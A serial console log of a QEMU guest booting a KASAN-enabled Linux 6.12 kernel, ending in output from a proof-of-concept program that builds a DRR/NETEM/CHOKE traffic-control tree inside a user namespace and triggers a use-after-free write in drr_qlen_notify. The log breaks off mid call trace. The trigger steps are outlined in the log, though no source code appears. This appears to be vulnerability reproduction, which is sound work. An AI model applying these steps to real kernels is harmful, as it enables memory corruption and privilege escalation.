bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.12.0-10728-g292207809486-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 15:16:11 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 301561387 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000318] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000337] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000338] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002124] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002130] Using GB pages for direct mapping
[    0.002459] RAMDISK: [mem 0x7fe8f000-0x7ffdffff]
[    0.002464] ACPI: Early table checksum verification disabled
[    0.002465] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002468] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002472] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002475] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002477] ACPI: FACS 0x000000007FFE0000 000040
[    0.002479] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002481] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002482] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002483] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002484] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002485] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002485] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002486] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002486] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002656] No NUMA configuration found
[    0.002656] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002658] NODE_DATA(0) allocated [mem 0x7fe8b940-0x7fe8efff]
[    0.002665] Zone ranges:
[    0.002666]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002667]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002667]   Normal   empty
[    0.002668] Movable zone start for each node
[    0.002668] Early memory node ranges
[    0.002669]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002670]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002670] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.005487] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.005525] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.030539] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.181516] kasan: KernelAddressSanitizer initialized
[    0.181720] ACPI: PM-Timer IO Port: 0x608
[    0.181729] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.181756] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.181759] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.181760] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.181761] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.181762] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.181762] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.181765] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.181765] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.181768] TSC deadline timer available
[    0.181770] CPU topo: Max. logical packages:   1
[    0.181771] CPU topo: Max. logical dies:       1
[    0.181771] CPU topo: Max. dies per package:   1
[    0.181773] CPU topo: Max. threads per core:   1
[    0.181774] CPU topo: Num. cores per package:     2
[    0.181774] CPU topo: Num. threads per package:   2
[    0.181774] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.181787] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.181799] kvm-guest: KVM setup pv remote TLB flush
[    0.181801] kvm-guest: setup PV sched yield
[    0.181806] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.181808] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.181808] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.181809] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.181810] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.181811] Booting paravirtualized kernel on KVM
[    0.181813] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.190308] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.190911] percpu: Embedded 68 pages/cpu s240920 r8192 d29416 u1048576
[    0.190939] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.190982] random: crng init done
[    0.190983] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.191092] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.192136] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.192167] Fallback order for Node 0: 0 
[    0.192170] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.192170] Policy zone: DMA32
[    0.192171] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.192172] stackdepot: allocating hash table via alloc_large_system_hash
[    0.192173] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.219518] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.220589] Dynamic Preempt: voluntary
[    0.222045] rcu: Preemptible hierarchical RCU implementation.
[    0.222046] rcu: 	RCU event tracing is enabled.
[    0.222046] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.222048] 	Trampoline variant of Tasks RCU enabled.
[    0.222048] 	Tracing variant of Tasks RCU enabled.
[    0.222049] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.222050] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.222063] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.222066] RCU Tasks Trace: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.228784] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.229012] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.231297] Console: colour VGA+ 80x25
[    0.231326] printk: legacy console [ttyS0] enabled
[    0.269995] ACPI: Core revision 20240827
[    0.270334] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.270905] APIC: Switch to symmetric I/O mode setup
[    0.271191] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.271606] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.272136] kvm-guest: setup PV IPIs
[    0.272976] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.273330] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.273944] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.274494] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.274954] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.275245] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.275584] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.275944] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.276393] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.276721] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.276942] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.277359] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.277942] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.278418] MMIO Stale Data: Unknown: No mitigations
[    0.278942] Register File Data Sampling: Vulnerable: No microcode
[    0.279296] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.279735] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.279942] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.280308] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.280942] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.281301] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.281656] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.298327] Freeing SMP alternatives memory: 48K
[    0.298610] pid_max: default: 32768 minimum: 301
[    0.298919] LSM: initializing lsm=capability,selinux
[    0.298963] SELinux:  Initializing.
[    0.299945] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.300944] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.302188] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.302913] Performance Events: unsupported p6 CPU model 183 no PMU driver, software events only.
[    0.302964] signal: max sigframe size: 3632
[    0.303235] rcu: Hierarchical SRCU implementation.
[    0.303509] rcu: 	Max phase no-delay instances is 400.
[    0.303858] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.304281] smp: Bringing up secondary CPUs ...
[    0.304659] smpboot: x86: Booting SMP configuration:
[    0.304944] .... node  #0, CPUs:      #1
[    0.305013] smp: Brought up 1 node, 2 CPUs
[    0.305433] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.306022] Memory: 1675384K/2096632K available (51200K kernel code, 8666K rwdata, 11196K rodata, 6000K init, 1456K bss, 416196K reserved, 0K cma-reserved)
[    0.307451] devtmpfs: initialized
[    0.309645] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.309947] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.310440] PM: RTC time: 15:18:53, date: 2026-05-05
[    0.310835] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.311127] audit: initializing netlink subsys (disabled)
[    0.311466] audit: type=2000 audit(1777994334.233:1): state=initialized audit_enabled=0 res=1
[    0.311466] thermal_sys: Registered thermal governor 'step_wise'
[    0.311943] thermal_sys: Registered thermal governor 'user_space'
[    0.312305] cpuidle: using governor menu
[    0.313092] PCI: Using configuration type 1 for base access
[    0.313481] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.316215] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.316614] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.317072] ACPI: Added _OSI(Module Device)
[    0.317264] ACPI: Added _OSI(Processor Device)
[    0.317576] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.317906] ACPI: Added _OSI(Processor Aggregator Device)
[    0.324798] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.332646] ACPI: Interpreter enabled
[    0.333974] ACPI: PM: (supports S0 S3 S4 S5)
[    0.334233] ACPI: Using IOAPIC for interrupt routing
[    0.334557] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.334943] PCI: Using E820 reservations for host bridge windows
[    0.335627] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.346863] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.346950] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.347404] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.347990] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.348791] PCI host bridge to bus 0000:00
[    0.348964] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.349365] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.349767] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.350944] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.351386] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.351836] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.351971] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.356141] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.360297] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.361733] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.362305] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.362701] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.362945] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.363336] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.363840] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.365169] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.365599] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.366098] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.366945] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.367947] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.369946] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.370368] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.374449] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.375395] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.376079] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.377565] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.382364] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.383054] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.383729] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.384271] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.384745] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.385905] iommu: Default domain type: Translated
[    0.386943] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.387462] SCSI subsystem initialized
[    0.387729] ACPI: bus type USB registered
[    0.387975] usbcore: registered new interface driver usbfs
[    0.389952] usbcore: registered new interface driver hub
[    0.390280] usbcore: registered new device driver usb
[    0.390613] pps_core: LinuxPPS API ver. 1 registered
[    0.390902] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.390949] PTP clock support registered
[    0.391997] Advanced Linux Sound Architecture Driver Initialized.
[    0.392016] NetLabel: Initializing
[    0.392215] NetLabel:  domain hash size = 128
[    0.392466] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.392820] NetLabel:  unlabeled traffic allowed by default
[    0.392993] PCI: Using ACPI for IRQ routing
[    0.393963] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.394296] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.394624] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.394943] vgaarb: loaded
[    0.395165] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.395456] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.398986] clocksource: Switched to clocksource kvm-clock
[    0.400662] VFS: Disk quotas dquot_6.6.0
[    0.400907] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.401576] pnp: PnP ACPI init
[    0.402737] pnp: PnP ACPI: found 6 devices
[    0.410486] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.411029] NET: Registered PF_INET protocol family
[    0.411962] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.412795] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.413286] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.413736] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.414202] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.415073] TCP: Hash tables configured (established 16384 bind 16384)
[    0.415483] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.415868] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.416337] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.416871] RPC: Registered named UNIX socket transport module.
[    0.417214] RPC: Registered udp transport module.
[    0.417481] RPC: Registered tcp transport module.
[    0.417748] RPC: Registered tcp-with-tls transport module.
[    0.418062] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.418758] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.419122] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.419475] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.419876] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.420280] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.420765] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.421104] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.421471] PCI: CLS 0 bytes, default 64
[    0.421753] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.421815] Unpacking initramfs...
[    0.422232] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.425185] Initialise system trusted keyrings
[    0.425496] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.426267] NFS: Registering the id_resolver key type
[    0.426565] Key type id_resolver registered
[    0.426806] Key type id_legacy registered
[    0.427084] 9p: Installing v9fs 9p2000 file system support
[    0.433800] Key type asymmetric registered
[    0.434083] Asymmetric key parser 'x509' registered
[    0.434397] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.434851] io scheduler mq-deadline registered
[    0.435123] io scheduler kyber registered
[    0.435585] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.436109] ACPI: button: Power Button [PWRF]
[    0.436318] Freeing initrd memory: 1348K
[    0.436826] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.437361] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.438480] Non-volatile memory driver v1.3
[    0.438723] Linux agpgart interface v0.103
[    0.439034] ACPI: bus type drm_connector registered
[    0.442766] loop: module loaded
[    0.444019] scsi host0: ata_piix
[    0.444409] scsi host1: ata_piix
[    0.444675] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.445124] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.446174] e100: Intel(R) PRO/100 Network Driver
[    0.446444] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.446765] e1000: Intel(R) PRO/1000 Network Driver
[    0.447069] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.600067] ata2: found unknown device (class 0)
[    0.600772] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.601876] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.619395] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.619792] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.632775] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.743221] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.028304] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.028702] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.029123] e1000e: Intel(R) PRO/1000 Network Driver
[    1.029407] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.029763] sky2: driver version 1.30
[    1.030287] usbcore: registered new interface driver usblp
[    1.030614] usbcore: registered new interface driver usb-storage
[    1.031009] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.031934] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.032227] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.032857] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.033438] rtc_cmos 00:05: RTC can wake from S4
[    1.034151] rtc_cmos 00:05: registered as rtc0
[    1.034473] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.035330] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@lists.linux.dev
[    1.035856] intel_pstate: CPU model not supported
[    1.036190] hid: raw HID events driver (C) Jiri Kosina
[    1.036983] usbcore: registered new interface driver usbhid
[    1.037651] usbhid: USB HID core driver
[    1.038275] netem: version 1.3
[    1.040880] Initializing XFRM netlink socket
[    1.041236] NET: Registered PF_INET6 protocol family
[    1.041921] Segment Routing with IPv6
[    1.042160] In-situ OAM (IOAM) with IPv6
[    1.042427] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.042984] NET: Registered PF_PACKET protocol family
[    1.043308] 9pnet: Installing 9P2000 support
[    1.043572] Key type dns_resolver registered
[    1.044053] IPI shorthand broadcast: enabled
[    1.054767] sched_clock: Marking stable (1012622738, 41923614)->(1057600169, -3053817)
[    1.055383] registered taskstats version 1
[    1.055619] Loading compiled-in X.509 certificates
[    1.062732] Demotion targets for Node 0: null
[    1.063099] PM:   Magic number: 10:231:335
[    1.063356] tty tty56: hash matches
[    1.063577] printk: legacy console [netcon0] enabled
[    1.063862] netconsole: network logging started
[    1.064210] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.064775] kworker/u8:1 (56) used greatest stack depth: 29472 bytes left
[    1.065504] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.065977] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.066447] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.066952] cfg80211: failed to load regulatory.db
[    1.067248] ALSA device list:
[    1.067424]   No soundcards found.
[    1.068434] Freeing unused kernel image (initmem) memory: 6000K
[    1.068679] Write protecting the kernel read-only data: 63488k
[    1.069148] Freeing unused kernel image (rodata/data gap) memory: 1092K
[    1.077169] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.077446] Run /init as init process
[    1.079896] mkdir (59) used greatest stack depth: 28872 bytes left
[    1.080414] mount (60) used greatest stack depth: 28304 bytes left
[    1.081197] mount (62) used greatest stack depth: 28288 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting
poc: entered user+net namespace
poc: lo up
poc: added root DRR qdisc 1:
poc: added DRR class 1:1 (netem host)
poc: added DRR class 1:2 (choke victim)
poc: added 32 dummy DRR classes
poc: added NETEM qdisc 2: under 1:1
poc: added CHOKE qdisc 3: under 1:2 (qth_min=0)
[    1.090301] drr_dequeue: netem qdisc 2: is non-work-conserving?
poc: sent packet to NETEM (stalls dequeue on whole tree)
poc: sent two packets to CHOKE (trigger missed notify)
poc: deleted DRR class 1:2 -> UAF primitive live
[    1.091271] ==================================================================
[    1.091549] BUG: KASAN: slab-use-after-free in drr_qlen_notify+0xd7/0xf0
[    1.091810] Write of size 8 at addr ffff88800999c758 by task poc/66
[    1.092052] 
[    1.092121] CPU: 1 UID: 0 PID: 66 Comm: poc Not tainted 6.12.0-10728-g292207809486-dirty #1
[    1.092438] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.092801] Call Trace:
[    1.092900]  <TASK>
[    1.092987]  dump_stack_lvl+0x53/0x70
[    1.093135]  print_report+0xce/0x660
[    1.093278]  ? drr_qlen_notify+0xd7/0xf0
[    1.093431]  kasan_report+0xc6/0x100
[    1.093573]  ? drr_qlen_notify+0xd7/0xf0
[    1.093726]  drr_qlen_notify+0xd7/0xf0
[    1.093874]  qdisc_tree_reduce_backlog+0x17e/0x4b0
[    1.094061]  drr_delete_class+0x1fa/0x470
[    1.094219]  ? __pfx_drr_delete_class+0x10/0x10
[    1.094396]  ? unwind_next_frame+0xc42/0x2440
[    1.094567]  tc_ctl_tclass+0xe7d/0x12a0
[    1.094718]  ? __pfx_tc_ctl_tclass+0x10/0x10
[    1.094886]  ? arch_stack_walk+0xa7/0x100
[    1.095044]  ? avc_has_perm_noaudit+0x8e/0x140
[    1.095221]  ? mutex_lock+0x8c/0xe0
[    1.095361]  ? __pfx_mutex_lock+0x10/0x10
[    1.095518]  rtnetlink_rcv_msg+0x365/0xa40
[    1.095679]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[    1.095858]  ? __pfx_sock_has_perm+0x10/0x10
[    1.096027]  netlink_rcv_skb+0x12f/0x370
[    1.096182]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[    1.096362]  ? __pfx_netlink_rcv_skb+0x10/0x10
[    1.096536]  ? __pfx___netlink_lookup+0x10/0x10
[    1.096713]  ? _copy_from_iter+0x214/0x1130
[    1.096877]  netlink_unicast+0x5c2/0x830
[    1.097030]  ? __pfx_netlink_unicast+0x10/0x10
[    1.097205]  ? __pfx_ldsem_down_read+0x10/0x10
[    1.097379]  netlink_sendmsg+0x75c/0xc00
[    1.097532]  ? __pfx_netlink_sendmsg+0x10/0x10
[    1.097705]  ? ldsem_up_read+0x12/0x40
[    1.097853]  __sys_sendto+0x3ae/0x420
[    1.097999]  ? __pfx___sys_sendto+0x10/0x10
[    1.098164]  ? alloc_fd+0x335/0x5b0
[    1.098303]  ? ksys_write+0xf8/0x1c0
[    1.098445]  ? __pfx_ksys_write+0x10/0x10
[    1.098601]  __x64_sys_sendto+0xdb/0x1b0
[    1.098754]  ? clear_bhb_loop+0x55/0xb0
[    1.098905]  ? clear_bhb_loop+0x55/0xb0
[    1.099055]  ? clear_bhb_loop+0x55/0xb0
[    1.099206]  do_syscall_64+0xa6/0x1a0
[    1.099352]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.099548] RIP: 0033:0x43c3c3
